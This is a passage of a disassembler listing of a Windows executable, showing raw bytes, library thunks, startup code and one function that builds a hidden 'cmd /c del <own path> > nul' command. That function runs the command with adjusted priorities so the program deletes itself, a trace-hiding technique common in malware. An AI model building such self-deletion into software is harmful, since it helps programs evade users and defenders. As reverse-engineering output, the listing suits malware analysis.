        00401ab5 40              ??         40h    @
        00401ab6 00              ??         00h
        00401ab7 8d              ??         8Dh
        00401ab8 54              ??         54h    T
        00401ab9 24              ??         24h    $
        00401aba 10              ??         10h
        00401abb 68              ??         68h    h
        00401abc 14              ??         14h                                              ?  ->  00403014
        00401abd 30              ??         30h    0
        00401abe 40              ??         40h    @
        00401abf 00              ??         00h
        00401ac0 52              ??         52h    R
        00401ac1 e8              ??         E8h
        00401ac2 fa              ??         FAh
        00401ac3 f5              ??         F5h
        00401ac4 ff              ??         FFh
        00401ac5 ff              ??         FFh
        00401ac6 8d              ??         8Dh
        00401ac7 44              ??         44h    D
        00401ac8 24              ??         24h    $
        00401ac9 24              ??         24h    $
        00401aca 56              ??         56h    V
        00401acb 8d              ??         8Dh
        00401acc 4c              ??         4Ch    L
        00401acd 24              ??         24h    $
        00401ace 1c              ??         1Ch
        00401acf 50              ??         50h    P
        00401ad0 51              ??         51h    Q
        00401ad1 e8              ??         E8h
        00401ad2 4a              ??         4Ah    J
        00401ad3 f7              ??         F7h
        00401ad4 ff              ??         FFh
        00401ad5 ff              ??         FFh
        00401ad6 6a              ??         6Ah    j
        00401ad7 06              ??         06h
        00401ad8 8d              ??         8Dh
        00401ad9 54              ??         54h    T
        00401ada 24              ??         24h    $
        00401adb 34              ??         34h    4
        00401adc 68              ??         68h    h
        00401add 70              ??         70h    p                                         ?  ->  00403070
        00401ade 30              ??         30h    0
        00401adf 40              ??         40h    @
        00401ae0 00              ??         00h
        00401ae1 52              ??         52h    R
        00401ae2 e8              ??         E8h
        00401ae3 cf              ??         CFh
        00401ae4 01              ??         01h
        00401ae5 00              ??         00h
        00401ae6 00              ??         00h
        00401ae7 83              ??         83h
        00401ae8 c4              ??         C4h
        00401ae9 20              ??         20h
        00401aea 85              ??         85h
        00401aeb c0              ??         C0h
        00401aec 74              ??         74h    t
        00401aed 44              ??         44h    D
        00401aee 8b              ??         8Bh
        00401aef 53              ??         53h    S
        00401af0 04              ??         04h
        00401af1 8d              ??         8Dh
        00401af2 44              ??         44h    D
        00401af3 24              ??         24h    $
        00401af4 0c              ??         0Ch
        00401af5 6a              ??         6Ah    j
        00401af6 00              ??         00h
        00401af7 50              ??         50h    P
        00401af8 8d              ??         8Dh
        00401af9 4c              ??         4Ch    L
        00401afa 24              ??         24h    $
        00401afb 24              ??         24h    $
        00401afc 56              ??         56h    V
        00401afd 51              ??         51h    Q
        00401afe 52              ??         52h    R
        00401aff ff              ??         FFh
        00401b00 d7              ??         D7h
        00401b01 85              ??         85h
        00401b02 c0              ??         C0h
        00401b03 74              ??         74h    t
        00401b04 1c              ??         1Ch
        00401b05 8b              ??         8Bh
        00401b06 4b              ??         4Bh    K
        00401b07 0c              ??         0Ch
        00401b08 6a              ??         6Ah    j
        00401b09 00              ??         00h
        00401b0a 8d              ??         8Dh
        00401b0b 44              ??         44h    D
        00401b0c 24              ??         24h    $
        00401b0d 20              ??         20h
        00401b0e 68              ??         68h    h
        00401b0f 00              ??         00h
        00401b10 04              ??         04h
        00401b11 00              ??         00h
        00401b12 00              ??         00h
        00401b13 50              ??         50h    P
        00401b14 51              ??         51h    Q
        00401b15 e8              ??         E8h
        00401b16 58              ??         58h    X
        00401b17 03              ??         03h
        00401b18 00              ??         00h
        00401b19 00              ??         00h
        00401b1a 8b              ??         8Bh
        00401b1b f0              ??         F0h
        00401b1c 83              ??         83h
        00401b1d fe              ??         FEh
        00401b1e ff              ??         FFh
        00401b1f 75              ??         75h    u
        00401b20 96              ??         96h
        00401b21 53              ??         53h    S
        00401b22 e8              ??         E8h
        00401b23 a7              ??         A7h
        00401b24 01              ??         01h
        00401b25 00              ??         00h
        00401b26 00              ??         00h
        00401b27 83              ??         83h
        00401b28 c4              ??         C4h
        00401b29 04              ??         04h
        00401b2a 6a              ??         6Ah    j
        00401b2b 00              ??         00h
        00401b2c ff              ??         FFh
        00401b2d 15              ??         15h
        00401b2e 0c              ??         0Ch                                              ?  ->  0040200c
        00401b2f 20              ??         20h
        00401b30 40              ??         40h    @
        00401b31 00              ??         00h
        00401b32 8b              ??         8Bh
        00401b33 15              ??         15h
        00401b34 d4              ??         D4h                                              ?  ->  004030d4
        00401b35 30              ??         30h    0
        00401b36 40              ??         40h    @
        00401b37 00              ??         00h
        00401b38 52              ??         52h    R
        00401b39 ff              ??         FFh
        00401b3a 15              ??         15h
        00401b3b 44              ??         44h    D                                         ?  ->  00402044
        00401b3c 20              ??         20h
        00401b3d 40              ??         40h    @
        00401b3e 00              ??         00h
        00401b3f 53              ??         53h    S
        00401b40 e8              ??         E8h
        00401b41 89              ??         89h
        00401b42 01              ??         01h
        00401b43 00              ??         00h
        00401b44 00              ??         00h
        00401b45 83              ??         83h
        00401b46 c4              ??         C4h
        00401b47 04              ??         04h
        00401b48 6a              ??         6Ah    j
        00401b49 00              ??         00h
        00401b4a ff              ??         FFh
        00401b4b 15              ??         15h
        00401b4c 0c              ??         0Ch                                              ?  ->  0040200c
        00401b4d 20              ??         20h
        00401b4e 40              ??         40h    @
        00401b4f 00              ??         00h
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined4 __stdcall FUN_00401b50(void)
                               assume FS_OFFSET = 0xffdff000
             undefined4        EAX:4          <RETURN>
             undefined1        Stack[-0x30c   local_30c                               XREF[1]:     00401b56(*)
                             FUN_00401b50                                    XREF[3]:     FUN_00401320:00401421(c),
                                                                                          FUN_00401320:004015d0(c),
                                                                                          _StartAddress_004016f0:00401848(
        00401b50 81 ec 48        SUB        ESP,0x348
                 03 00 00
        00401b56 8d 44 24 3c     LEA        EAX=>local_30c,[ESP + 0x3c]
        00401b5a 53              PUSH       EBX
        00401b5b 55              PUSH       EBP
        00401b5c 56              PUSH       ESI
        00401b5d 57              PUSH       EDI
        00401b5e 68 04 01        PUSH       0x104                                            DWORD nSize for GetModuleFileNameA
                 00 00
        00401b63 33 ff           XOR        EDI,EDI
        00401b65 50              PUSH       EAX                                              LPSTR lpFilename for GetModuleFi
        00401b66 57              PUSH       EDI                                              HMODULE hModule for GetModuleFil
        00401b67 ff 15 6c        CALL       dword ptr [->KERNEL32.DLL::GetModuleFileNameA]   = 000024ba
                 20 40 00
        00401b6d 85 c0           TEST       EAX,EAX
        00401b6f 0f 84 2b        JZ         LAB_00401ca0
                 01 00 00
        00401b75 8d 4c 24 4c     LEA        ECX,[ESP + 0x4c]
        00401b79 68 04 01        PUSH       0x104                                            DWORD cchBuffer for GetShortPath
                 00 00
        00401b7e 8d 54 24 50     LEA        EDX,[ESP + 0x50]
        00401b82 51              PUSH       ECX                                              LPSTR lpszShortPath for GetShort
        00401b83 52              PUSH       EDX                                              LPCSTR lpszLongPath for GetShort
        00401b84 ff 15 68        CALL       dword ptr [->KERNEL32.DLL::GetShortPathNameA]    = 000024a6
                 20 40 00
        00401b8a 85 c0           TEST       EAX,EAX
        00401b8c 0f 84 0e        JZ         LAB_00401ca0
                 01 00 00
        00401b92 8d 84 24        LEA        EAX,[ESP + 0x254]
                 54 02 00 00
        00401b99 68 04 01        PUSH       0x104                                            DWORD nSize for GetEnvironmentVa
                 00 00
        00401b9e 50              PUSH       EAX                                              LPSTR lpBuffer for GetEnvironmen
        00401b9f 68 90 30        PUSH       s_COMSPEC_00403090                               LPCSTR lpName for GetEnvironment
                 40 00
        00401ba4 ff 15 64        CALL       dword ptr [->KERNEL32.DLL::GetEnvironmentVaria   = 0000248c
                 20 40 00
        00401baa 85 c0           TEST       EAX,EAX
        00401bac 0f 84 ee        JZ         LAB_00401ca0
                 00 00 00
        00401bb2 8d 8c 24        LEA        ECX,[ESP + 0x150]
                 50 01 00 00
        00401bb9 68 88 30        PUSH       s_/c_del_00403088                                LPCSTR lpString2 for lstrcpyA
                 40 00
        00401bbe 51              PUSH       ECX                                              LPSTR lpString1 for lstrcpyA
        00401bbf ff 15 60        CALL       dword ptr [->KERNEL32.DLL::lstrcpyA]             = 00002480
                 20 40 00
        00401bc5 8b 35 5c        MOV        ESI,dword ptr [->KERNEL32.DLL::lstrcatA]         = 00002474
                 20 40 00
        00401bcb 8d 54 24 4c     LEA        EDX,[ESP + 0x4c]
        00401bcf 8d 84 24        LEA        EAX,[ESP + 0x150]
                 50 01 00 00
        00401bd6 52              PUSH       EDX                                              LPCSTR lpString2 for lstrcatA
        00401bd7 50              PUSH       EAX                                              LPSTR lpString1 for lstrcatA
        00401bd8 ff d6           CALL       ESI=>KERNEL32.DLL::lstrcatA
        00401bda 8d 8c 24        LEA        ECX,[ESP + 0x150]
                 50 01 00 00
        00401be1 68 80 30        PUSH       s_>_nul_00403080                                 LPCSTR lpString2 for lstrcatA
                 40 00
        00401be6 51              PUSH       ECX                                              LPSTR lpString1 for lstrcatA
        00401be7 ff d6           CALL       ESI=>KERNEL32.DLL::lstrcatA
        00401be9 89 7c 24 18     MOV        dword ptr [ESP + 0x18],EDI
        00401bed 8d 94 24        LEA        EDX,[ESP + 0x254]
                 54 02 00 00
        00401bf4 8d 84 24        LEA        EAX,[ESP + 0x150]
                 50 01 00 00
        00401bfb 89 7c 24 28     MOV        dword ptr [ESP + 0x28],EDI
        00401bff 89 7c 24 2c     MOV        dword ptr [ESP + 0x2c],EDI
        00401c03 8b 3d 38        MOV        EDI,dword ptr [->KERNEL32.DLL::GetCurrentProce   = 000023d6
                 20 40 00
        00401c09 68 00 01        PUSH       0x100                                            DWORD dwPriorityClass for SetPri
                 00 00
        00401c0e c7 44 24        MOV        dword ptr [ESP + 0x14],0x3c
                 14 3c 00
                 00 00
        00401c16 c7 44 24        MOV        dword ptr [ESP + 0x20],DAT_00403078              = 4Fh    O
                 20 78 30
                 40 00
        00401c1e 89 54 24 24     MOV        dword ptr [ESP + 0x24],EDX
        00401c22 89 44 24 28     MOV        dword ptr [ESP + 0x28],EAX
        00401c26 c7 44 24        MOV        dword ptr [ESP + 0x18],0x40
                 18 40 00
                 00 00
        00401c2e ff d7           CALL       EDI=>KERNEL32.DLL::GetCurrentProcess
        00401c30 8b 35 58        MOV        ESI,dword ptr [->KERNEL32.DLL::SetPriorityClass] = 00002460
                 20 40 00
        00401c36 50              PUSH       EAX                                              HANDLE hProcess for SetPriorityC
        00401c37 ff d6           CALL       ESI=>KERNEL32.DLL::SetPriorityClass
        00401c39 8b 1d 54        MOV        EBX,dword ptr [->KERNEL32.DLL::GetCurrentThread] = 0000244c
                 20 40 00
        00401c3f 6a 0f           PUSH       0xf                                              int nPriority for SetThreadPrior
        00401c41 ff d3           CALL       EBX=>KERNEL32.DLL::GetCurrentThread
        00401c43 8b 2d 50        MOV        EBP,dword ptr [->KERNEL32.DLL::SetThreadPriori   = 00002438
                 20 40 00
        00401c49 50              PUSH       EAX                                              HANDLE hThread for SetThreadPrio
        00401c4a ff d5           CALL       EBP=>KERNEL32.DLL::SetThreadPriority
        00401c4c 8d 4c 24 10     LEA        ECX,[ESP + 0x10]
        00401c50 51              PUSH       ECX                                              SHELLEXECUTEINFOA * pExecInfo fo
        00401c51 ff 15 d4        CALL       dword ptr [->SHELL32.DLL::ShellExecuteExA]       = 0000250a
                 20 40 00
        00401c57 85 c0           TEST       EAX,EAX
        00401c59 74 37           JZ         LAB_00401c92
        00401c5b 8b 54 24 48     MOV        EDX,dword ptr [ESP + 0x48]
        00401c5f 6a 40           PUSH       0x40                                             DWORD dwPriorityClass for SetPri
        00401c61 52              PUSH       EDX                                              HANDLE hProcess for SetPriorityC
        00401c62 ff d6           CALL       ESI=>KERNEL32.DLL::SetPriorityClass
        00401c64 8b 44 24 48     MOV        EAX,dword ptr [ESP + 0x48]
        00401c68 6a 01           PUSH       0x1                                              BOOL bDisablePriorityBoost for S
        00401c6a 50              PUSH       EAX                                              HANDLE hProcess for SetProcessPr
        00401c6b ff 15 4c        CALL       dword ptr [->KERNEL32.DLL::SetProcessPriorityB   = 0000241e
                 20 40 00
        00401c71 8d 4c 24 4c     LEA        ECX,[ESP + 0x4c]
        00401c75 6a 00           PUSH       0x0                                              LPCVOID dwItem2 for SHChangeNotify
        00401c77 51              PUSH       ECX                                              LPCVOID dwItem1 for SHChangeNotify
        00401c78 6a 01           PUSH       0x1                                              UINT uFlags for SHChangeNotify
        00401c7a 6a 04           PUSH       0x4                                              LONG wEventId for SHChangeNotify
        00401c7c ff 15 d8        CALL       dword ptr [->SHELL32.DLL::SHChangeNotify]        = 000024f8
                 20 40 00
        00401c82 5f              POP        EDI
        00401c83 5e              POP        ESI
        00401c84 5d              POP        EBP
        00401c85 b8 01 00        MOV        EAX,0x1
                 00 00
        00401c8a 5b              POP        EBX
        00401c8b 81 c4 48        ADD        ESP,0x348
                 03 00 00
        00401c91 c3              RET
                             LAB_00401c92                                    XREF[1]:     00401c59(j)
        00401c92 6a 20           PUSH       0x20                                             DWORD dwPriorityClass for SetPri
        00401c94 ff d7           CALL       EDI=>KERNEL32.DLL::GetCurrentProcess
        00401c96 50              PUSH       EAX                                              HANDLE hProcess for SetPriorityC
        00401c97 ff d6           CALL       ESI=>KERNEL32.DLL::SetPriorityClass
        00401c99 6a 00           PUSH       0x0                                              int nPriority for SetThreadPrior
        00401c9b ff d3           CALL       EBX=>KERNEL32.DLL::GetCurrentThread
        00401c9d 50              PUSH       EAX                                              HANDLE hThread for SetThreadPrio
        00401c9e ff d5           CALL       EBP=>KERNEL32.DLL::SetThreadPriority
                             LAB_00401ca0                                    XREF[3]:     00401b6f(j), 00401b8c(j),
                                                                                          00401bac(j)
        00401ca0 5f              POP        EDI
        00401ca1 5e              POP        ESI
        00401ca2 5d              POP        EBP
        00401ca3 33 c0           XOR        EAX,EAX
        00401ca5 5b              POP        EBX
        00401ca6 81 c4 48        ADD        ESP,0x348
                 03 00 00
        00401cac c3              RET
        00401cad 90 90 90        align      align(3)
                             **************************************************************
                             *                       THUNK FUNCTION                       *
                             **************************************************************
                             thunk uintptr_t __cdecl _beginthread(_StartAddress * _St
                               Thunked-Function: MSVCRT.DLL::_beginthread
                               assume FS_OFFSET = 0xffdff000
             uintptr_t         EAX:4          <RETURN>
             _StartAddress *   Stack[0x4]:4   _StartAddress
             uint              Stack[0x8]:4   _StackSize
             void *            Stack[0xc]:4   _ArgList
                             MSVCRT.DLL::_beginthread                        XREF[1]:     FUN_00401320:004015e7(c)
        00401cb0 ff 25 80        JMP        dword ptr [->MSVCRT.DLL::_beginthread]
                 20 40 00
                             **************************************************************
                             *                       THUNK FUNCTION                       *
                             **************************************************************
                             thunk int __cdecl _strnicmp(char * _Str1, char * _Str2,
                               Thunked-Function: MSVCRT.DLL::_strnicmp
                               assume FS_OFFSET = 0xffdff000
             int               EAX:4          <RETURN>
             char *            Stack[0x4]:4   _Str1
             char *            Stack[0x8]:4   _Str2
             size_t            Stack[0xc]:4   _MaxCount
                             MSVCRT.DLL::_strnicmp                           XREF[2]:     FUN_00401320:00401586(c),
                                                                                          FUN_00401320:0040159e(c)
        00401cb6 ff 25 84        JMP        dword ptr [->MSVCRT.DLL::_strnicmp]
                 20 40 00
                             **************************************************************
                             *                       THUNK FUNCTION                       *
                             **************************************************************
                             thunk int __cdecl sprintf(char * _Dest, char * _Format,
                               Thunked-Function: MSVCRT.DLL::sprintf
                               assume FS_OFFSET = 0xffdff000
             int               EAX:4          <RETURN>
             char *            Stack[0x4]:4   _Dest
             char *            Stack[0x8]:4   _Format
                             MSVCRT.DLL::sprintf                             XREF[2]:     FUN_00401320:00401527(c),
                                                                                          FUN_00401320:00401537(c)
        00401cbc ff 25 88        JMP        dword ptr [->MSVCRT.DLL::sprintf]
                 20 40 00
                             **************************************************************
                             *                       THUNK FUNCTION                       *
                             **************************************************************
                             thunk long __cdecl atol(char * _Str)
                               Thunked-Function: MSVCRT.DLL::atol
                               assume FS_OFFSET = 0xffdff000
             long              EAX:4          <RETURN>
             char *            Stack[0x4]:4   _Str
                             MSVCRT.DLL::atol                                XREF[1]:     FUN_00401320:0040143d(c)
        00401cc2 ff 25 8c        JMP        dword ptr [->MSVCRT.DLL::atol]
                 20 40 00
                             **************************************************************
                             *                       THUNK FUNCTION                       *
                             **************************************************************
                             thunk char * __cdecl strchr(char * _Str, int _Val)
                               Thunked-Function: MSVCRT.DLL::strchr
                               assume FS_OFFSET = 0xffdff000
             char *            EAX:4          <RETURN>
             char *            Stack[0x4]:4   _Str
             int               Stack[0x8]:4   _Val
                             MSVCRT.DLL::strchr                              XREF[1]:     FUN_00401320:00401331(c)
        00401cc8 ff 25 90        JMP        dword ptr [->MSVCRT.DLL::strchr]
                 20 40 00
                             **************************************************************
                             *                       THUNK FUNCTION                       *
                             **************************************************************
                             thunk void __cdecl free(void * _Memory)
                               Thunked-Function: MSVCRT.DLL::free
                               assume FS_OFFSET = 0xffdff000
             void              <VOID>         <RETURN>
             void *            Stack[0x4]:4   _Memory
                             MSVCRT.DLL::free                                XREF[2]:     FUN_00401600:004016a4(c),
                                                                                          _StartAddress_004016f0:00401840(
        00401cce ff 25 94        JMP        dword ptr [->MSVCRT.DLL::free]
                 20 40 00
                             **************************************************************
                             *                       THUNK FUNCTION                       *
                             **************************************************************
                             thunk void * __cdecl malloc(size_t _Size)
                               Thunked-Function: MSVCRT.DLL::malloc
                               assume FS_OFFSET = 0xffdff000
             void *            EAX:4          <RETURN>
             size_t            Stack[0x4]:4   _Size
                             MSVCRT.DLL::malloc                              XREF[2]:     FUN_00401600:00401618(c),
                                                                                          _StartAddress_004016f0:004016f7(
        00401cd4 ff 25 98        JMP        dword ptr [->MSVCRT.DLL::malloc]
                 20 40 00
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined __stdcall entry(void)
                               assume FS_OFFSET = 0xffdff000
             undefined         <UNASSIGNED>   <RETURN>
             undefined4        Stack[-0x8]:4  local_8                                 XREF[1]:     00401d02(W)
             undefined4        Stack[-0x1c]:4 local_1c                                XREF[1]:     00401cfd(W)
             undefined2        Stack[-0x30]:2 local_30                                XREF[1]:     00401dea(R)
             undefined4        Stack[-0x34]:4 local_34                                XREF[2]:     00401dd7(W),
                                                                                                   00401de4(R)
             undefined1        Stack[-0x60]:1 local_60                                XREF[1]:     00401dda(*)
             undefined1        Stack[-0x64]:1 local_64                                XREF[1]:     00401d8b(*)
             undefined1        Stack[-0x68]:1 local_68                                XREF[1]:     00401d83(*)
             undefined4        Stack[-0x6c]:4 local_6c                                XREF[1]:     00401e0e(W)
             undefined4        Stack[-0x70]:4 local_70                                XREF[2]:     00401d76(W),
                                                                                                   00401d79(*)
             undefined1        Stack[-0x74]:1 local_74                                XREF[1]:     00401d87(*)
             undefined4        Stack[-0x78]:4 local_78                                XREF[4]:     00401dae(W),
                                                                                                   00401db7(W),
                                                                                                   00401dca(W),
                                                                                                   00401df6(W)
                             entry                                           XREF[2]:     Entry Point(*), 00400108(*)
        00401cda 55              PUSH       EBP
        00401cdb 8b ec           MOV        EBP,ESP
        00401cdd 6a ff           PUSH       -0x1
        00401cdf 68 50 21        PUSH       DAT_00402150                                     = FFh
                 40 00
        00401ce4 68 60 1e        PUSH       DAT_00401e60                                     = FFh
                 40 00
        00401ce9 64 a1 00        MOV        EAX,FS:[0x0]=>ExceptionList                      = 00000000
                 00 00 00
        00401cef 50              PUSH       EAX
        00401cf0 64 89 25        MOV        dword ptr FS:[0x0]=>ExceptionList,ESP            = 00000000
                 00 00 00 00
        00401cf7 83 ec 68        SUB        ESP,0x68
        00401cfa 53              PUSH       EBX
        00401cfb 56              PUSH       ESI
        00401cfc 57              PUSH       EDI
        00401cfd 89 65 e8        MOV        dword ptr [EBP + local_1c],ESP
        00401d00 33 db           XOR        EBX,EBX
        00401d02 89 5d fc        MOV        dword ptr [EBP + local_8],EBX
        00401d05 6a 02           PUSH       0x2                                              int param_1 for __set_app_type
        00401d07 ff 15 c4        CALL       dword ptr [->MSVCRT.DLL::__set_app_type]         = 00002604
                 20 40 00
        00401d0d 59              POP        ECX
        00401d0e 83 0d 1c        OR         dword ptr [DAT_0040361c],0xffffffff
                 36 40 00 ff
        00401d15 83 0d 20        OR         dword ptr [DAT_00403620],0xffffffff
                 36 40 00 ff
        00401d1c ff 15 c0        CALL       dword ptr [->MSVCRT.DLL::__p__fmode]             = 000025f6
                 20 40 00
        00401d22 8b 0d 18        MOV        ECX,dword ptr [DAT_00403618]
                 36 40 00
        00401d28 89 08           MOV        dword ptr [EAX],ECX
        00401d2a ff 15 bc        CALL       dword ptr [->MSVCRT.DLL::__p__commode]           = 000025e6
                 20 40 00
        00401d30 8b 0d 14        MOV        ECX,dword ptr [DAT_00403614]
                 36 40 00
        00401d36 89 08           MOV        dword ptr [EAX],ECX
        00401d38 a1 b8 20        MOV        EAX,[->MSVCRT.DLL::_adjust_fdiv]                 = 000025d6
                 40 00
        00401d3d 8b 00           MOV        EAX,dword ptr [EAX]
        00401d3f a3 24 36        MOV        [DAT_00403624],EAX
                 40 00
        00401d44 e8 10 01        CALL       FUN_00401e59                                     undefined FUN_00401e59(void)
                 00 00
        00401d49 39 1d 98        CMP        dword ptr [DAT_00403098],EBX                     = 00000001h
                 30 40 00
        00401d4f 75 0c           JNZ        LAB_00401d5d
        00401d51 68 56 1e        PUSH       LAB_00401e56
                 40 00
        00401d56 ff 15 b4        CALL       dword ptr [->MSVCRT.DLL::__setusermatherr]       = 000025c2
                 20 40 00
        00401d5c 59              POP        ECX
                             LAB_00401d5d                                    XREF[1]:     00401d4f(j)
        00401d5d e8 e2 00        CALL       FUN_00401e44                                     undefined FUN_00401e44(void)
                 00 00
        00401d62 68 0c 30        PUSH       DAT_0040300c
                 40 00
        00401d67 68 08 30        PUSH       DAT_00403008
                 40 00
        00401d6c e8 cd 00        CALL       MSVCRT.DLL::initterm                             undefined initterm()
                 00 00
        00401d71 a1 10 36        MOV        EAX,[DAT_00403610]
                 40 00
        00401d76 89 45 94        MOV        dword ptr [EBP + local_70],EAX
        00401d79 8d 45 94        LEA        EAX=>local_70,[EBP + -0x6c]
        00401d7c 50              PUSH       EAX                                              _startupinfo * _StartInfo for __
        00401d7d ff 35 0c        PUSH       dword ptr [_DoWildCard_0040360c]                 int _DoWildCard for __getmainargs
                 36 40 00
        00401d83 8d 45 9c        LEA        EAX=>local_68,[EBP + -0x64]
        00401d86 50              PUSH       EAX                                              char * * * _Env for __getmainargs
        00401d87 8d 45 90        LEA        EAX=>local_74,[EBP + -0x70]
        00401d8a 50              PUSH       EAX                                              char * * * _Argv for __getmainargs
        00401d8b 8d 45 a0        LEA        EAX=>local_64,[EBP + -0x60]
        00401d8e 50              PUSH       EAX                                              int * _Argc for __getmainargs
        00401d8f ff 15 ac        CALL       dword ptr [->MSVCRT.DLL::__getmainargs]          = 000025a6
                 20 40 00
        00401d95 68 04 30        PUSH       DAT_00403004
                 40 00
        00401d9a 68 00 30        PUSH       DAT_00403000
                 40 00
        00401d9f e8 9a 00        CALL       MSVCRT.DLL::initterm                             undefined initterm()
                 00 00
        00401da4 83 c4 24        ADD        ESP,0x24
        00401da7 a1 a8 20        MOV        EAX,[->MSVCRT.DLL::_acmdln]                      = 0000259c
                 40 00
        00401dac 8b 30           MOV        ESI,dword ptr [EAX]
        00401dae 89 75 8c        MOV        dword ptr [EBP + local_78],ESI
        00401db1 80 3e 22        CMP        byte ptr [ESI],0x22
        00401db4 75 3a           JNZ        LAB_00401df0
                             LAB_00401db6                                    XREF[1]:     00401dc2(j)
        00401db6 46              INC        ESI
        00401db7 89 75 8c        MOV        dword ptr [EBP + local_78],ESI
        00401dba 8a 06           MOV        AL,byte ptr [ESI]
        00401dbc 3a c3           CMP        AL,BL
        00401dbe 74 04           JZ         LAB_00401dc4
        00401dc0 3c 22           CMP        AL,0x22
        00401dc2 75 f2           JNZ        LAB_00401db6
                             LAB_00401dc4                                    XREF[1]:     00401dbe(j)
        00401dc4 80 3e 22        CMP        byte ptr [ESI],0x22
        00401dc7 75 04           JNZ        LAB_00401dcd
                             LAB_00401dc9                                    XREF[1]:     00401dd5(j)
        00401dc9 46              INC        ESI
        00401dca 89 75 8c        MOV        dword ptr [EBP + local_78],ESI
                             LAB_00401dcd                                    XREF[2]:     00401dc7(j), 00401df3(j)
        00401dcd 8a 06           MOV        AL,byte ptr [ESI]
        00401dcf 3a c3           CMP        AL,BL
        00401dd1 74 04           JZ         LAB_00401dd7
        00401dd3 3c 20           CMP        AL,0x20
        00401dd5 76 f2           JBE        LAB_00401dc9
                             LAB_00401dd7                                    XREF[1]:     00401dd1(j)
        00401dd7 89 5d d0        MOV        dword ptr [EBP + local_34],EBX
        00401dda 8d 45 a4        LEA        EAX=>local_60,[EBP + -0x5c]
        00401ddd 50              PUSH       EAX                                              LPSTARTUPINFOA lpStartupInfo for
        00401dde ff 15 70        CALL       dword ptr [->KERNEL32.DLL::GetStartupInfoA]      = 00002664
                 20 40 00
        00401de4 f6 45 d0 01     TEST       byte ptr [EBP + local_34],0x1
        00401de8 74 11           JZ         LAB_00401dfb
        00401dea 0f b7 45 d4     MOVZX      EAX,word ptr [EBP + local_30]
        00401dee eb 0e           JMP        LAB_00401dfe
                             LAB_00401df0                                    XREF[2]:     00401db4(j), 00401df9(j)
        00401df0 80 3e 20        CMP        byte ptr [ESI],0x20
        00401df3 76 d8           JBE        LAB_00401dcd
        00401df5 46              INC        ESI
        00401df6 89 75 8c        MOV        dword ptr [EBP + local_78],ESI
        00401df9 eb f5           JMP        LAB_00401df0
                             LAB_00401dfb                                    XREF[1]:     00401de8(j)
        00401dfb 6a 0a           PUSH       0xa
        00401dfd 58              POP        EAX
                             LAB_00401dfe                                    XREF[1]:     00401dee(j)
        00401dfe 50              PUSH       EAX
        00401dff 56              PUSH       ESI
        00401e00 53              PUSH       EBX
        00401e01 53              PUSH       EBX                                              LPCSTR lpModuleName for GetModul
        00401e02 ff 15 74        CALL       dword ptr [->KERNEL32.DLL::GetModuleHandleA]     = 00002650
                 20 40 00
        00401e08 50              PUSH       EAX
        00401e09 e8 32 f4        CALL       FUN_00401240                                     undefined4 FUN_00401240(HINSTANC
                 ff ff
        00401e0e 89 45 98        MOV        dword ptr [EBP + local_6c],EAX
        00401e11 50              PUSH       EAX                                              int _Code for exit
        00401e12 ff 15 a4        CALL       dword ptr [->MSVCRT.DLL::exit]                   = 00002594
                 20 40 00
                             -- Flow Override: CALL_RETURN (COMPUTED_CALL_TERMINATOR)
             assume FS_OFFSET = <UNKNOWN>
                             LAB_00401e18                                    XREF[1]:     00402154(*)
        00401e18 8b 45 ec        MOV        EAX,dword ptr [EBP + -0x14]
        00401e1b 8b 08           MOV        ECX,dword ptr [EAX]
        00401e1d 8b 09           MOV        ECX,dword ptr [ECX]
        00401e1f 89 4d 88        MOV        dword ptr [EBP + -0x78],ECX
        00401e22 50              PUSH       EAX
        00401e23 51              PUSH       ECX
        00401e24 e8 0f 00        CALL       MSVCRT.DLL::_XcptFilter                          int _XcptFilter(ulong _Exception
                 00 00
        00401e29 59              POP        ECX
        00401e2a 59              POP        ECX
        00401e2b c3              RET
             assume FS_OFFSET = 0xffdff000
                             LAB_00401e2c                                    XREF[1]:     00402158(*)
        00401e2c 8b 65 e8        MOV        ESP,dword ptr [EBP + -0x18]
        00401e2f ff 75 88        PUSH       dword ptr [EBP + -0x78]
        00401e32 ff 15 9c        CALL       dword ptr [->MSVCRT.DLL::_exit]                  = 0000257e
                 20 40 00
                             **************************************************************
                             *                       THUNK FUNCTION                       *
                             **************************************************************
                             thunk int __cdecl _XcptFilter(ulong _ExceptionNum, _EXCE
                               Thunked-Function: MSVCRT.DLL::_XcptFilter
             int               EAX:4          <RETURN>
             ulong             Stack[0x4]:4   _ExceptionNum
             _EXCEPTION_POI    Stack[0x8]:4   _ExceptionPtr
                             MSVCRT.DLL::_XcptFilter                         XREF[1]:     00401e24(c)
        00401e38 ff 25 a0        JMP        dword ptr [->MSVCRT.DLL::_XcptFilter]
                 20 40 00
                             **************************************************************
                             *                       THUNK FUNCTION                       *
                             **************************************************************
                             thunk undefined __cdecl initterm()
                               Thunked-Function: MSVCRT.DLL::initterm
                               assume FS_OFFSET = 0xffdff000
             undefined         <UNASSIGNED>   <RETURN>
                             MSVCRT.DLL::initterm                            XREF[2]:     entry:00401d6c(c),
                                                                                          entry:00401d9f(c)
        00401e3e ff 25 b0        JMP        dword ptr [->MSVCRT.DLL::initterm]
                 20 40 00
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined __stdcall FUN_00401e44(void)
                               assume FS_OFFSET = 0xffdff000
             undefined         <UNASSIGNED>   <RETURN>
                             FUN_00401e44                                    XREF[1]:     entry:00401d5d(c)
        00401e44 68 00 00        PUSH       0x30000                                          uint _Mask for _controlfp
                 03 00
        00401e49 68 00 00        PUSH       0x10000                                          uint _NewValue for _controlfp
                 01 00
        00401e4e e8 13 00        CALL       MSVCRT.DLL::_controlfp                           uint _controlfp(uint _NewValue,
                 00 00
        00401e53 59              POP        ECX
        00401e54 59              POP        ECX
        00401e55 c3              RET
                             LAB_00401e56                                    XREF[1]:     entry:00401d51(*)
        00401e56 33 c0           XOR        EAX,EAX
        00401e58 c3              RET
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined __stdcall FUN_00401e59(void)
                               assume FS_OFFSET = 0xffdff000
             undefined         <UNASSIGNED>   <RETURN>
                             FUN_00401e59                                    XREF[1]:     entry:00401d44(c)
        00401e59 c3              RET
        00401e5a cc              ??         CCh
        00401e5b cc              ??         CCh
        00401e5c cc              ??         CCh
        00401e5d cc              ??         CCh
        00401e5e cc              ??         CCh
        00401e5f cc              ??         CCh
                             DAT_00401e60                                    XREF[1]:     entry:00401ce4(*)
        00401e60 ff              ??         FFh
        00401e61 25              ??         25h    %
        00401e62 c8              ??         C8h                                              ?  ->  004020c8
        00401e63 20              ??         20h
